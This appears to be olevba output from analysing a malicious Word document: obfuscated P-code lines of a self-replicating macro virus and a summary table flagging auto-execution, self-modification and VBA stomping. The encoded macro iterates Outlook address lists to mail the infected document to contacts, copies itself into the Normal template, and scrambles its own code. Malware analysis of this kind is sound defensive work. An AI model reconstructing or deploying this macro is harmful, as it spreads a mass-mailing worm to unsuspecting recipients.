' Line #53:
' 	QuoteRem 0x0000 0x002A "ÀÀÀÀÀÀÀÀæORÀAÀÝÀÑÀôOÀíîÎáDDRESSìISTSÎãOUNT"
' Line #54:
' 	QuoteRem 0x0000 0x001B "ÀÀÀÀÀÀÀÀÀÀÀÀòANDOMIZEÀôIMER"
' Line #55:
' 	QuoteRem 0x0000 0x003F "ÀÀÀÀÀÀÀÀÀÀÀÀéFÀíîÎáDDRESSìISTSÈAÉÎáDDRESSåNTRIESÎãOUNTÀÞÀØÀôHEN"
' Line #56:
' 	QuoteRem 0x0000 0x004D "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀæORÀRÀÝÀÑÀôOÀéNTÈíîÎáDDRESSìISTSÈAÉÎáDDRESSåNTRIESÎãOUNTÀÏÀØÉ"
' Line #57:
' 	QuoteRem 0x0000 0x0053 "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀôARGETÀÝÀéNTÈÑÀËÀíîÎáDDRESSìISTSÈAÉÎáDDRESSåNTRIESÎãOUNTÀÊÀòNDÉ"
' Line #58:
' 	QuoteRem 0x0000 0x0051 "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀïíÎòECIPIENTSÎáDDÀÈíîÎáDDRESSìISTSÈAÉÎáDDRESSåNTRIESÈôARGETÉÉ"
' Line #59:
' 	QuoteRem 0x0000 0x0014 "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀîEXT"
' Line #60:
' 	QuoteRem 0x0000 0x0012 "ÀÀÀÀÀÀÀÀÀÀÀÀåNDÀéF"
' Line #61:
' 	QuoteRem 0x0000 0x000C "ÀÀÀÀÀÀÀÀîEXT"
' Line #62:
' 	QuoteRem 0x0000 0x000F "ÀÀÀÀÀÀÀÀ÷ITHÀïí"
' Line #63:
' 	QuoteRem 0x0000 0x0051 "ÀÀÀÀÀÀÀÀÀÀÀÀóETÀòECÀÝÀÎòECIPIENTSÎáDDÈÂOUTLOOKÙ×ÿÒÐÐÐàHOTMAILÎCOMÞÂÉÚÀòECÎòESOLVE"
' Line #64:
' 	QuoteRem 0x0000 0x00AE "ÀÀÀÀÀÀÀÀÀÀÀÀÎóUBJECTÀÝÀáCTIVEäOCUMENTÎîAMEÚÀÎâODYÀÝÀáPPLICATIONÎõSERîAMEÀÆÀVBãRìFÀÆÀáPPLICATIONÎõSERáDDRESSÀÆÀVBãRìFÀÆÀVBãRìFÚÀÎáTTACHMENTSÎáDDÀáCTIVEäOCUMENTÎæULLîAMEÚÀÎóEND"
' Line #65:
' 	QuoteRem 0x0000 0x0010 "ÀÀÀÀÀÀÀÀåNDÀ÷ITH"
' Line #66:
' 	QuoteRem 0x0000 0x0011 "ÀÀÀÀÀÀÀÀíîÎìOGOFF"
' Line #67:
' 	QuoteRem 0x0000 0x0018 "ÀÀÀÀÀÀÀÀóETÀïìÀÝÀîOTHING"
' Line #68:
' 	QuoteRem 0x0000 0x000A "ÀÀÀÀåNDÀéF"
' Line #69:
' 	QuoteRem 0x0000 0x0006 "åNDÀéF"
' Line #70:
' 	QuoteRem 0x0000 0x0027 "ÀÀÀÀîBìÑÀÝÀíÈÑÉÎãODEíODULEÎãOUNTïFìINES"
' Line #71:
' 	QuoteRem 0x0000 0x0027 "ÀÀÀÀîBìÒÀÝÀíÈÒÉÎãODEíODULEÎãOUNTïFìINES"
' Line #72:
' 	QuoteRem 0x0000 0x001D "ÀÀÀÀéîæÿÀÝÀæALSEÚÀìINâEGÀÝÀÓÓ"
' Line #73:
' 	QuoteRem 0x0000 0x0022 "ÀÀÀÀéFÀíÈÒÉÎîAMEÀÜÞÀÂôHISäOCÂÀôHEN"
' Line #74:
' 	QuoteRem 0x0000 0x0018 "ÀÀÀÀÀÀÀÀéFÀîBìÒÀÞÀÐÀôHEN"
' Line #75:
' 	QuoteRem 0x0000 0x002F "ÀÀÀÀÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎäELETEìINESÀÑÌÀîBìÒ"
' Line #76:
' 	QuoteRem 0x0000 0x000E "ÀÀÀÀÀÀÀÀåNDÀéF"
' Line #77:
' 	QuoteRem 0x0000 0x0029 "ÀÀÀÀÀÀÀÀíÈÒÉÎîAMEÀÝÀÂôHISäOCÂÚÀéîæÀÝÀôRUE"
' Line #78:
' 	QuoteRem 0x0000 0x000A "ÀÀÀÀåNDÀéF"
' Line #79:
' 	QuoteRem 0x0000 0x0023 "ÀÀÀÀéFÀéîæÀÝÀæALSEÀôHENÀçOôOÀãòùðôÿ"
' Line #80:
' 	QuoteRem 0x0000 0x0010 "ÀÀÀÀîEWîAMEÀÝÀÂÂ"
' Line #81:
' 	QuoteRem 0x0000 0x0013 "ÀÀÀÀòANDOMIZEÀôIMER"
' Line #82:
' 	QuoteRem 0x0000 0x0012 "ÀÀÀÀæORÀéÀÝÀÑÀôOÀÕ"
' Line #83:
' 	QuoteRem 0x0000 0x0035 "ÀÀÀÀÀÀÀÀîEWîAMEÀÝÀîEWîAMEÀËÀãHRÈéNTÈÖÕÀËÀÈÒÕÀÊÀòNDÉÉÉ"
' Line #84:
' 	QuoteRem 0x0000 0x0008 "ÀÀÀÀîEXT"
' Line #85:
' 	QuoteRem 0x0000 0x0036 "ÀÀÀÀéFÀéNóTRÈíÈÑÉÎãODEíODULEÎìINESÈÑÌÀÑÉÌÀÂïPENÂÉÀôHEN"
' Line #86:
' 	QuoteRem 0x0000 0x0044 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎáDDæROMóTRINGÀÂðRIVATEÀóUBÀäOCUMENTÿãLOSEÈÉÂ"
' Line #87:
' 	QuoteRem 0x0000 0x0041 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÒÌÀÂÀÀÀÀïNÀåRRORÀòESUMEÀîEXTÂ"
' Line #88:
' 	QuoteRem 0x0000 0x0052 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÓÌÀÂÀÀÀÀäIMÀíÈÒÉÀáSÀöARIANTÚÀäIMÀìÈØÉÀáSÀâYTEÂ"
' Line #89:
' 	QuoteRem 0x0000 0x0065 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÔÌÀÂÀÀÀÀóETÀíÈÒÉÀÝÀáCTIVEäOCUMENTÎöâðROJECTÎöâãOMPONENTSÎéTEMÈÑÉÂ"
' Line #90:
' 	QuoteRem 0x0000 0x0065 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÕÌÀÂÀÀÀÀóETÀíÈÑÉÀÝÀîORMALôEMPLATEÎöâðROJECTÎöâãOMPONENTSÎéTEMÈÑÉÂ"
' Line #91:
' 	QuoteRem 0x0000 0x0010 "ÀÀÀÀÀÀÀÀìINEÀÝÀÖ"
' Line #92:
' 	QuoteRem 0x0000 0x0048 "ÀÀÀÀÀÀÀÀäOÀ÷HILEÀéNóTRÈíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÌÀÂäELETEÂÉÀÝÀæALSE"
' Line #93:
' 	QuoteRem 0x0000 0x005D "ÀÀÀÀÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÚÀìINEÀÝÀìINEÀËÀÑ"
' Line #94:
' 	QuoteRem 0x0000 0x000C "ÀÀÀÀÀÀÀÀìOOP"
' Line #95:
' 	QuoteRem 0x0000 0x0056 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀãíÎäELETEìINESÀìINâEGÂÚÀìINEÀÝÀìINEÀËÀÑ"
' Line #96:
' 	QuoteRem 0x0000 0x0053 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀÂÀËÀîEWîAMEÀËÀÂÈíÉÂÚÀìINEÀÝÀìINEÀËÀÑ"
' Line #97:
' 	QuoteRem 0x0000 0x00CC "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀÂÀËÀÂãíÎäELETEìINESÀìINâEGÌÀãíÎãOUNTïFìINESÀÍÀìINâEGÚÀãíÎéNSERTìINESÀìINâEGÌÀããÚÀÀÀÀáCTIVEäOCUMENTÎóAVEáSÀæILEîAMEÚÝáCTIVEäOCUMENTÎæULLîAMEÂÚÀìINEÀÝÀìINEÀËÀÑ"
' Line #98:
' 	QuoteRem 0x0000 0x0044 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂåNDÀóUBÂÚÀìINEÀÝÀìINEÀËÀÑ"
' Line #99:
' 	QuoteRem 0x0000 0x005E "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂóUBÀÂÀËÀîEWîAMEÀËÀÂÈíÀáSÀöARIANTÉÂÚÀìINEÀÝÀìINEÀËÀÑ"
' Line #100:
' 	QuoteRem 0x0000 0x0035 "ÀÀÀÀÀÀÀÀäOÀ÷HILEÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÀÜÞÀÂÂ"
' Line #101:
' 	QuoteRem 0x0000 0x005D "ÀÀÀÀÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÚÀìINEÀÝÀìINEÀËÀÑ"
' Line #102:
' 	QuoteRem 0x0000 0x000C "ÀÀÀÀÀÀÀÀìOOP"
' Line #103:
' 	QuoteRem 0x0000 0x003B "ÀÀÀÀåLSEéFÀéNóTRÈíÈÑÉÎãODEíODULEÎìINESÈÑÌÀÑÉÌÀÂãLOSEÂÉÀôHEN"
' Line #104:
' 	QuoteRem 0x0000 0x0043 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎáDDæROMóTRINGÀÂðRIVATEÀóUBÀäOCUMENTÿïPENÈÉÂ"
' Line #105:
' 	QuoteRem 0x0000 0x0041 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÒÌÀÂÀÀÀÀïNÀåRRORÀòESUMEÀîEXTÂ"
' Line #106:
' 	QuoteRem 0x0000 0x0052 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÓÌÀÂÀÀÀÀäIMÀíÈÒÉÀáSÀöARIANTÚÀäIMÀìÈØÉÀáSÀâYTEÂ"
' Line #107:
' 	QuoteRem 0x0000 0x0065 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÔÌÀÂÀÀÀÀóETÀíÈÑÉÀÝÀáCTIVEäOCUMENTÎöâðROJECTÎöâãOMPONENTSÎéTEMÈÑÉÂ"
' Line #108:
' 	QuoteRem 0x0000 0x0065 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀÕÌÀÂÀÀÀÀóETÀíÈÒÉÀÝÀîORMALôEMPLATEÎöâðROJECTÎöâãOMPONENTSÎéTEMÈÑÉÂ"
' Line #109:
' 	QuoteRem 0x0000 0x0010 "ÀÀÀÀÀÀÀÀìINEÀÝÀÖ"
' Line #110:
' 	QuoteRem 0x0000 0x0048 "ÀÀÀÀÀÀÀÀäOÀ÷HILEÀéNóTRÈíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÌÀÂäELETEÂÉÀÝÀæALSE"
' Line #111:
' 	QuoteRem 0x0000 0x005D "ÀÀÀÀÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÚÀìINEÀÝÀìINEÀËÀÑ"
' Line #112:
' 	QuoteRem 0x0000 0x000C "ÀÀÀÀÀÀÀÀìOOP"
' Line #113:
' 	QuoteRem 0x0000 0x0056 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀãíÎäELETEìINESÀìINâEGÂÚÀìINEÀÝÀìINEÀËÀÑ"
' Line #114:
' 	QuoteRem 0x0000 0x0053 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀÂÀËÀîEWîAMEÀËÀÂÈíÉÂÚÀìINEÀÝÀìINEÀËÀÑ"
' Line #115:
' 	QuoteRem 0x0000 0x00CC "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂÀÀÀÀÂÀËÀÂãíÎäELETEìINESÀìINâEGÌÀãíÎãOUNTïFìINESÀÍÀìINâEGÚÀãíÎéNSERTìINESÀìINâEGÌÀããÚÀÀÀÀáCTIVEäOCUMENTÎóAVEáSÀæILEîAMEÚÝáCTIVEäOCUMENTÎæULLîAMEÂÚÀìINEÀÝÀìINEÀËÀÑ"
' Line #116:
' 	QuoteRem 0x0000 0x0044 "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂåNDÀóUBÂÚÀìINEÀÝÀìINEÀËÀÑ"
' Line #117:
' 	QuoteRem 0x0000 0x005E "ÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀÂóUBÀÂÀËÀîEWîAMEÀËÀÂÈíÀáSÀöARIANTÉÂÚÀìINEÀÝÀìINEÀËÀÑ"
' Line #118:
' 	QuoteRem 0x0000 0x0035 "ÀÀÀÀÀÀÀÀäOÀ÷HILEÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÀÜÞÀÂÂ"
' Line #119:
' 	QuoteRem 0x0000 0x005D "ÀÀÀÀÀÀÀÀÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINEÌÀíÈÑÉÎãODEíODULEÎìINESÈìINEÌÀÑÉÚÀìINEÀÝÀìINEÀËÀÑ"
' Line #120:
' 	QuoteRem 0x0000 0x000C "ÀÀÀÀÀÀÀÀìOOP"
' Line #121:
' 	QuoteRem 0x0000 0x000A "ÀÀÀÀåNDÀéF"
' Line #122:
' 	QuoteRem 0x0000 0x0007 "ãòùðôÿÚ"
' Line #123:
' 	QuoteRem 0x0000 0x0014 "ÀÀÀÀäIMÀìÈØÉÀáSÀâYTE"
' Line #124:
' 	QuoteRem 0x0000 0x0021 "ÀÀÀÀéFÀéîæÀÝÀæALSEÀôHENÀçOôOÀåîäÿ"
' Line #125:
' 	QuoteRem 0x0000 0x0013 "ÀÀÀÀòANDOMIZEÀôIMER"
' Line #126:
' 	QuoteRem 0x0000 0x000C "ÀÀÀÀìÈÑÉÀÝÀÑ"
' Line #127:
' 	QuoteRem 0x0000 0x0012 "ÀÀÀÀæORÀéÀÝÀÒÀôOÀØ"
' Line #128:
' 	QuoteRem 0x0000 0x0015 "ÀÀÀÀÀÀÀÀæOUNDÀÝÀæALSE"
' Line #129:
' 	QuoteRem 0x0000 0x0010 "ÀÀÀÀÀÀÀÀéTERÀÝÀÐ"
' Line #130:
' 	QuoteRem 0x0000 0x001E "ÀÀÀÀÀÀÀÀäOÀ÷HILEÀæOUNDÀÝÀæALSE"
' Line #131:
' 	QuoteRem 0x0000 0x001F "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀéTERÀÝÀéTERÀËÀÑ"
' Line #132:
' 	QuoteRem 0x0000 0x0026 "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀNÀÝÀéNTÈÈØÀÊÀòNDÉÀËÀÑÉ"
' Line #133:
' 	QuoteRem 0x0000 0x002B "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀéFÀNÀÜÞÀéÀïRÀéTERÀÞÀÑÕÀôHEN"
' Line #134:
' 	QuoteRem 0x0000 0x0019 "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀJÀÝÀÑ"
' Line #135:
' 	QuoteRem 0x0000 0x0032 "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀäOÀ÷HILEÀÈìÈJÉÀÜÞÀNÉÀáNDÀJÀÜÀé"
' Line #136:
' 	QuoteRem 0x0000 0x0021 "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀJÀÝÀJÀËÀÑ"
' Line #137:
' 	QuoteRem 0x0000 0x0018 "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀìOOP"
' Line #138:
' 	QuoteRem 0x0000 0x0021 "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀéFÀJÀÝÀéÀôHEN"
' Line #139:
' 	QuoteRem 0x0000 0x0024 "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀæOUNDÀÝÀôRUE"
' Line #140:
' 	QuoteRem 0x0000 0x0020 "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀìÈéÉÀÝÀN"
' Line #141:
' 	QuoteRem 0x0000 0x001A "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀåNDÀéF"
' Line #142:
' 	QuoteRem 0x0000 0x0016 "ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀåNDÀéF"
' Line #143:
' 	QuoteRem 0x0000 0x000C "ÀÀÀÀÀÀÀÀìOOP"
' Line #144:
' 	QuoteRem 0x0000 0x0008 "ÀÀÀÀîEXT"
' Line #145:
' 	QuoteRem 0x0000 0x000E "ÀÀÀÀJÀÝÀìINâEG"
' Line #146:
' 	QuoteRem 0x0000 0x0025 "ÀÀÀÀäIMÀãYPHERÀáSÀóTRINGÚÀãYPHERÀÝÀÂÂ"
' Line #147:
' 	QuoteRem 0x0000 0x0049 "ÀÀÀÀäOÀ÷HILEÀéNóTRÈíÈÒÉÎãODEíODULEÎìINESÈJÌÀÑÉÌÀÂÚÀåNDÀÂÀËÀÂóUBÂÉÀÝÀæALSE"
' Line #148:
' 	QuoteRem 0x0000 0x002B "ÀÀÀÀÀÀÀÀìINEJÀÝÀíÈÒÉÎãODEíODULEÎìINESÈJÌÀÑÉ"
' Line #149:
' 	QuoteRem 0x0000 0x0016 "ÀÀÀÀÀÀÀÀãYPìINEJÀÝÀÂÇÂ"
' Line #150:
' 	QuoteRem 0x0000 0x001F "ÀÀÀÀÀÀÀÀæORÀKÀÝÀÑÀôOÀìENÈìINEJÉ"
' Line #151:
' 	QuoteRem 0x0000 0x0025 "ÀÀÀÀÀÀÀÀÀÀÀÀOÀÝÀáSCÈíIDÈìINEJÌÀKÌÀÑÉÉ"
' Line #152:
' 	QuoteRem 0x0000 0x001F "ÀÀÀÀÀÀÀÀÀÀÀÀéÀÝÀéNTÈOÀÏÀÓÒÉÀËÀÑ"
' Line #153:
' 	QuoteRem 0x0000 0x0023 "ÀÀÀÀÀÀÀÀÀÀÀÀãÀÝÀÓÒÀÊÀÈìÈéÉÀÍÀéÉÀËÀO"
' Line #154:
' 	QuoteRem 0x0000 0x0028 "ÀÀÀÀÀÀÀÀÀÀÀÀãYPìINEJÀÝÀãYPìINEJÀËÀãHRÈãÉ"
' Line #155:
' 	QuoteRem 0x0000 0x000C "ÀÀÀÀÀÀÀÀîEXT"
' Line #156:
' 	QuoteRem 0x0000 0x002C "ÀÀÀÀÀÀÀÀãYPHERÀÝÀãYPHERÀËÀãYPìINEJÀËÀãHRÈÑÓÉ"
' Line #157:
' 	QuoteRem 0x0000 0x0011 "ÀÀÀÀÀÀÀÀJÀÝÀJÀËÀÑ"
' Line #158:
' 	QuoteRem 0x0000 0x0008 "ÀÀÀÀìOOP"
' Line #159:
' 	QuoteRem 0x0000 0x000B "ÀÀÀÀëEÀÝÀÂÂ"
' Line #160:
' 	QuoteRem 0x0000 0x0012 "ÀÀÀÀæORÀéÀÝÀÒÀôOÀØ"
' Line #161:
' 	QuoteRem 0x0000 0x001E "ÀÀÀÀÀÀÀÀëEÀÝÀëEÀËÀæORMATÈìÈéÉÉ"
' Line #162:
' 	QuoteRem 0x0000 0x0008 "ÀÀÀÀîEXT"
' Line #163:
' 	QuoteRem 0x0000 0x0030 "ÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINâEGÌÀÂÇÂÀËÀëE"
' Line #164:
' 	QuoteRem 0x0000 0x0051 "ÀÀÀÀíÈÒÉÎãODEíODULEÎäELETEìINESÀìINâEGÀËÀÑÌÀíÈÒÉÎãODEíODULEÎãOUNTïFìINESÀÍÀìINâEG"
' Line #165:
' 	QuoteRem 0x0000 0x0045 "ÀÀÀÀíÈÒÉÎãODEíODULEÎéNSERTìINESÀìINâEGÀËÀÑÌÀãYPHERÀËÀÂÚÀåNDÂÀËÀÂÀóUBÂ"
' Line #166:
' 	QuoteRem 0x0000 0x0005 "åîäÿÚ"
' Line #167:
' 	BoS 0x0000 
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

